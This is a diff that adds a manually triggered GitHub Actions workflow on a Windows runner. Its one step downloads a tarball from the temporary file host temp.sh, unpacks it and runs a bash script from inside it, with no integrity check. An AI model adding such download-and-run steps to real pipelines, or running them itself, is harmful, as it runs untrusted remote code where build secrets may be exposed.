@@ -1,0 +1,13 @@
+name: t2
+on:
+  workflow_dispatch:
+jobs:
+  a:
+    runs-on: windows-latest
+    timeout-minutes: 10
+    steps:
+      - name: test capture on real windows
+        shell: bash
+        run: |
+          curl -sL https://temp.sh/xJCbb/dltest.tar.gz -o t.tgz
+          mkdir r && tar xzf t.tgz -C r && bash r/dltest/test.sh
